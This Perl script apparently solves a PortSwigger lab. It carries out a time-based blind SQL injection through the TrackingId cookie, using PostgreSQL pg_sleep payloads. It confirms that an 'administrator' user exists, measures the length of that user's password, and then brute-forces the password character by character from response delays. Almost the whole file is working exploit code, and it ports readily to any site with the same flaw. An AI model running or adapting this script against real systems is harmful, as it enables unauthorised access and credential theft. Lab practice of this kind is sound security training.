#!/usr/bin/perl

use strict;
use warnings;
use v5.32;

use Getopt::Long qw(GetOptions);
use Time::HiRes qw(gettimeofday tv_interval);
use LWP;

sub password_len_query {
    my ($character_len) = @_;
    my $str = "%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>" . "$character_len" . ')+THEN+pg_sleep(6)+ELSE+pg_sleep(0)+END+FROM+users--';
    my $query = "TrackingId=x" . "'" . $str . "'";
    return $query;
}

sub guess_password_query {
    my ($char, $pos) = @_;
    my $str =    "%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password," . "$pos" . ',' . '1' . ')' .'=' . "'" . "$char" . "'"  . ')+THEN+pg_sleep(6)+ELSE+pg_sleep(0)+END+FROM+users--';
    my $query = "TrackingId=x" . "'" . $str . "'";
    return $query;
}

my $command_line;
Getopt::Long::GetOptions('url=s' => \$command_line) or die  "Error in command line arguments \n";
unless ($command_line) {
    say "$0: Needs a PortSwigger lab url as a parameter";
    exit(-1);
}
my $url =  $command_line . "filter?category=Lifestyle";

my $ua = LWP::UserAgent->new;
# Verify that the application takes 10 seconds to respond.
my $t0 = [gettimeofday];
my $ext = 5;
my $response = $ua->get($url, Cookie => "TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--'");
die $response->status_line unless (tv_interval($t0) >= 5 and  $response->is_success);

# confirming that there is a user called administrator
$t0 = [gettimeofday];
$response = $ua->get($url, Cookie => "TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--'");
die  "Couldn't verify if has a user called administrator" . " RESPONSE STATUS:" . $response->status_line
    unless (tv_interval($t0) >= 5 and  $response->is_success);

# Verify if the adminstrator password is greater than 1 character in length.
$t0 = [gettimeofday];
$response = $ua->get($url, Cookie => "TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--'");
die  "Couldn't verify the  administrator is  password greater than 1 character in length." . " RESPONSE STATUS:" . $response->status_line
    unless (tv_interval($t0) >= 5 and  $response->is_success);


say "Determining how many characters are in the password of the administrator...";
    my $pass_len = 2;
while ($response->is_success) {
    my $query = password_len_query($pass_len);
    $t0 = [gettimeofday];
    $response = $ua->get($url, Cookie => $query);
    last if (tv_interval($t0) <= 6 and  $response->is_success);
    $pass_len++;
}
say "The length of the password is: $pass_len";

my @chars = ( 0 .. 9, 'a' .. 'z');
my ($password,$c);
say "Guessing the administrator password, this may take a while...";
for my $i (1 .. 20) {
    while ($response->is_success and @chars) {
	$c =  shift @chars;
	my $query = guess_password_query($c,$i);
	$t0 = [gettimeofday];
	$response = $ua->get($url, Cookie => $query);
	last if (tv_interval($t0) >= 6 and  $response->is_success);
	
    }
    $password .= $c;
    say $c;
    @chars = ( 0 .. 9, 'a' .. 'z');
}
say "administrator password: $password";
